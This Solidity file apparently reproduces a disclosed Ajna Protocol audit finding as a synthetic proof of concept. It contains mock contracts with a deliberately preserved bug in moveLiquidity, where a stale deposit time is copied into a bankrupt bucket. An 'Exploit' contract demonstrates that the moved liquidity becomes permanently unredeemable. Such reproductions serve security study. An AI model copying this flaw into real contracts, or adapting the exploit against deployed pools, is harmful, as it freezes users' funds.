// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ajna Protocol — PositionManager's moveLiquidity can set wrong deposit
    time and permanently freeze LP funds moved
    (Code4rena 2023-05-ajna, [H-02], finding #20070, reporter hyh)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: moveLiquidity copies fromPosition.depositTime onto toPosition
    without checking the destination bucket's bankruptcyTime. Healthy LP moved
    into a bucket that defaulted AFTER the source depositTime is marked with a
    stale depositTime and subsequent redeem/move reverts BucketBankrupt —
    permanent freeze of the moved funds.

    Vulnerable line preserved VERBATIM (@> VULN). No fork, no cheats.
//////////////////////////////////////////////////////////////////////////*/

library EnumerableSet {
    struct UintSet {
        uint256[] _values;
        mapping(uint256 => uint256) _indexes;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        if (set._indexes[value] != 0) return false;
        set._values.push(value);
        set._indexes[value] = set._values.length;
        return true;
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex == 0) return false;
        uint256 toDeleteIndex = valueIndex - 1;
        uint256 lastIndex = set._values.length - 1;
        if (toDeleteIndex != lastIndex) {
            uint256 lastValue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastValue;
            set._indexes[lastValue] = valueIndex;
        }
        set._values.pop();
        delete set._indexes[value];
        return true;
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return set._values.length;
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return set._indexes[value] != 0;
    }
}

struct Position {
    uint256 lps;
    uint256 depositTime;
}

struct MoveLiquidityParams {
    uint256 tokenId;
    address pool;
    uint256 fromIndex;
    uint256 toIndex;
    uint256 expiry;
}

struct RedeemPositionsParams {
    uint256 tokenId;
    address pool;
    uint256[] indexes;
}

contract MockPool {
    struct Bucket {
        uint256 bucketLP;
        uint256 bucketCollateral;
        uint256 bankruptcyTime;
        uint256 bucketDeposit;
    }

    mapping(uint256 => Bucket) internal _buckets;
    mapping(uint256 => mapping(address => uint256)) public lenderLP;
    // lender deposit time as pool would report after move (correct value)
    mapping(uint256 => mapping(address => uint256)) public lenderDepositTime;

    function setBucket(
        uint256 index,
        uint256 bucketLP,
        uint256 bucketCollateral,
        uint256 bankruptcyTime,
        uint256 bucketDeposit
    ) external {
        _buckets[index] = Bucket(bucketLP, bucketCollateral, bankruptcyTime, bucketDeposit);
    }

    function setLenderLP(uint256 index, address lender, uint256 amount, uint256 depositTime) external {
        lenderLP[index][lender] = amount;
        lenderDepositTime[index][lender] = depositTime;
    }

    function updateInterest() external {}

    function bucketInfo(uint256 index)
        external
        view
        returns (uint256 bucketLP, uint256 bucketCollateral, uint256 bankruptcyTime, uint256 bucketDeposit, uint256)
    {
        Bucket storage b = _buckets[index];
        return (b.bucketLP, b.bucketCollateral, b.bankruptcyTime, b.bucketDeposit, 0);
    }

    function lenderInfo(uint256 index, address lender) external view returns (uint256 lpBalance, uint256 depositTime) {
        return (lenderLP[index][lender], lenderDepositTime[index][lender]);
    }

    /// @dev Full move for this finding (focus is depositTime, not partial).
    ///      Mirrors LenderActions: destination deposit time is max(from, toBankruptcy+1).
    function moveQuoteToken(uint256 maxQuote, uint256 fromIndex, uint256 toIndex, uint256 /*expiry*/)
        external
        returns (uint256 lpbAmountFrom, uint256 lpbAmountTo)
    {
        lpbAmountFrom = maxQuote;
        lpbAmountTo = maxQuote;
        require(lenderLP[fromIndex][msg.sender] >= lpbAmountFrom, "pool LP");
        uint256 fromDepositTime = lenderDepositTime[fromIndex][msg.sender];
        lenderLP[fromIndex][msg.sender] -= lpbAmountFrom;
        lenderLP[toIndex][msg.sender] += lpbAmountTo;

        uint256 toBankruptcy = _buckets[toIndex].bankruptcyTime;
        // Correct pool-side time (what PositionManager SHOULD copy):
        uint256 correctToTime = fromDepositTime;
        if (toBankruptcy >= correctToTime) {
            correctToTime = toBankruptcy + 1;
        }
        lenderDepositTime[toIndex][msg.sender] = correctToTime;

        _buckets[fromIndex].bucketDeposit -= maxQuote;
        _buckets[toIndex].bucketDeposit += maxQuote;
        _buckets[fromIndex].bucketLP =
            _buckets[fromIndex].bucketLP > lpbAmountFrom ? _buckets[fromIndex].bucketLP - lpbAmountFrom : 0;
        _buckets[toIndex].bucketLP += lpbAmountTo;
    }
}

contract PositionManager {
    using EnumerableSet for EnumerableSet.UintSet;

    error RemovePositionFailed();
    error BucketBankrupt();

    mapping(uint256 => address) public poolKey;
    mapping(uint256 => mapping(uint256 => Position)) internal positions;
    mapping(uint256 => EnumerableSet.UintSet) internal positionIndexes;
    mapping(uint256 => address) internal _owners;
    uint256 internal _nextId = 1;

    function ownerOf(uint256 tokenId_) public view returns (address) {
        address o = _owners[tokenId_];
        require(o != address(0), "not minted");
        return o;
    }

    function mint(address pool_, address recipient_) external returns (uint256 tokenId_) {
        tokenId_ = _nextId++;
        _owners[tokenId_] = recipient_;
        poolKey[tokenId_] = pool_;
    }

    function seedPosition(uint256 tokenId_, uint256 index, uint256 lps, uint256 depositTime) external {
        positions[tokenId_][index] = Position({lps: lps, depositTime: depositTime});
        positionIndexes[tokenId_].add(index);
    }

    function getPosition(uint256 tokenId_, uint256 index) external view returns (uint256 lps, uint256 depositTime) {
        Position storage p = positions[tokenId_][index];
        return (p.lps, p.depositTime);
    }

    function hasIndex(uint256 tokenId_, uint256 index) external view returns (bool) {
        return positionIndexes[tokenId_].contains(index);
    }

    function _lpToQuoteToken(
        uint256,
        uint256,
        uint256 deposit,
        uint256 lenderLPBalance,
        uint256 maxQuoteToken,
        uint256
    ) internal pure returns (uint256 quoteTokenAmount) {
        quoteTokenAmount = lenderLPBalance;
        if (quoteTokenAmount > deposit) quoteTokenAmount = deposit;
        if (quoteTokenAmount > maxQuoteToken) quoteTokenAmount = maxQuoteToken;
    }

    function _bucketBankruptAfterDeposit(MockPool pool_, uint256 index_, uint256 depositTime_)
        internal
        view
        returns (bool)
    {
        (,, uint256 bankruptcyTime,,) = pool_.bucketInfo(index_);
        return depositTime_ <= bankruptcyTime;
    }

    modifier mayInteract(address pool_, uint256 tokenId_) {
        require(_owners[tokenId_] != address(0), "not minted");
        require(msg.sender == _owners[tokenId_], "NoAuth");
        require(pool_ == poolKey[tokenId_], "WrongPool");
        _;
    }

    /// @notice Verbatim depositTime copy bug from PositionManager.moveLiquidity.
    function moveLiquidity(MoveLiquidityParams calldata params_)
        external
        mayInteract(params_.pool, params_.tokenId)
    {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];
        uint256 vars_depositTime = fromPosition.depositTime;
        if (vars_depositTime == 0) revert RemovePositionFailed();

        MockPool pool = MockPool(params_.pool);
        pool.updateInterest();

        (,, uint256 bankruptcyTime, uint256 bucketDeposit,) = pool.bucketInfo(params_.fromIndex);
        if (vars_depositTime <= bankruptcyTime) revert BucketBankrupt();

        uint256 maxQuote = fromPosition.lps;
        if (maxQuote > bucketDeposit) maxQuote = bucketDeposit;

        if (!positionIndexes[params_.tokenId].remove(params_.fromIndex)) revert RemovePositionFailed();
        positionIndexes[params_.tokenId].add(params_.toIndex);

        (uint256 lpbAmountFrom, uint256 lpbAmountTo) =
            pool.moveQuoteToken(maxQuote, params_.fromIndex, params_.toIndex, params_.expiry);

        fromPosition.lps -= lpbAmountFrom;
        positions[params_.tokenId][params_.toIndex].lps += lpbAmountTo;
        // update position deposit time to the from bucket deposit time
        positions[params_.tokenId][params_.toIndex].depositTime = vars_depositTime; // @> VULN: copies source depositTime; ignores destination bucket bankruptcy
        // FIX: (, vars_depositTime) = pool.lenderInfo(params_.toIndex, address(this));
        //      toPosition.depositTime = vars_depositTime;
    }

    /// @notice Verbatim redeem gate that freezes funds when depositTime is stale.
    function redeemPositions(RedeemPositionsParams calldata params_)
        external
        mayInteract(params_.pool, params_.tokenId)
    {
        MockPool pool = MockPool(params_.pool);
        uint256 indexesLength = params_.indexes.length;
        for (uint256 i = 0; i < indexesLength;) {
            uint256 index = params_.indexes[i];
            Position memory position = positions[params_.tokenId][index];
            if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();
            // check that bucket didn't go bankrupt after memorialization
            if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) revert BucketBankrupt();
            unchecked {
                ++i;
            }
        }
    }
}

/// CREATE order: pool (1), pm (2).
contract Exploit {
    MockPool public pool;
    PositionManager public pm;
    uint256 public tokenId;

    uint256 public constant FROM = 1000;
    uint256 public constant TO = 2000;
    uint256 public constant LP = 50 ether;
    // Source memorialized at t=100; destination bucket defaulted at t=500.
    uint256 public constant FROM_DEPOSIT_TIME = 100;
    uint256 public constant TO_BANKRUPTCY = 500;

    uint256 public toDepositTimeAfterMove;
    uint256 public poolCorrectToTime;
    bool public redeemBricked;

    constructor() {
        pool = new MockPool(); // nonce 1
        pm = new PositionManager(); // nonce 2

        // Healthy source bucket (no bankruptcy).
        pool.setBucket(FROM, LP, 0, 0, LP);
        // Destination already went bankrupt AFTER the source deposit time.
        pool.setBucket(TO, 0, 0, TO_BANKRUPTCY, 0);
        pool.setLenderLP(FROM, address(pm), LP, FROM_DEPOSIT_TIME);

        tokenId = pm.mint(address(pool), address(this));
        pm.seedPosition(tokenId, FROM, LP, FROM_DEPOSIT_TIME);
    }

    function run() external {
        (uint256 lpsBefore, uint256 dtBefore) = pm.getPosition(tokenId, FROM);
        require(lpsBefore == LP && dtBefore == FROM_DEPOSIT_TIME, "pre");
        // Source is healthy: depositTime > source bankruptcy (0).
        require(FROM_DEPOSIT_TIME > 0, "source healthy");

        MoveLiquidityParams memory p = MoveLiquidityParams({
            tokenId: tokenId,
            pool: address(pool),
            fromIndex: FROM,
            toIndex: TO,
            expiry: type(uint256).max
        });
        pm.moveLiquidity(p);

        (uint256 toLps, uint256 toDt) = pm.getPosition(tokenId, TO);
        toDepositTimeAfterMove = toDt;
        (, poolCorrectToTime) = pool.lenderInfo(TO, address(pm));

        // HARM: PositionManager stamped the STALE source depositTime onto toPosition,
        // while the pool correctly renewed deposit time past destination bankruptcy.
        require(toLps == LP, "LP moved");
        require(toDepositTimeAfterMove == FROM_DEPOSIT_TIME, "stale depositTime copied");
        require(toDepositTimeAfterMove <= TO_BANKRUPTCY, "stale is bankrupt vs to bucket");
        require(poolCorrectToTime == TO_BANKRUPTCY + 1, "pool fixed its own time");

        // redeemPositions now reverts BucketBankrupt — moved LP is permanently frozen.
        uint256[] memory idxs = new uint256[](1);
        idxs[0] = TO;
        RedeemPositionsParams memory rp =
            RedeemPositionsParams({tokenId: tokenId, pool: address(pool), indexes: idxs});
        redeemBricked = false;
        try pm.redeemPositions(rp) {
            redeemBricked = false;
        } catch {
            redeemBricked = true;
        }
        require(redeemBricked, "redeem must brick on stale depositTime");
        require(toLps > 0 && redeemBricked, "harm not demonstrated");
    }
}
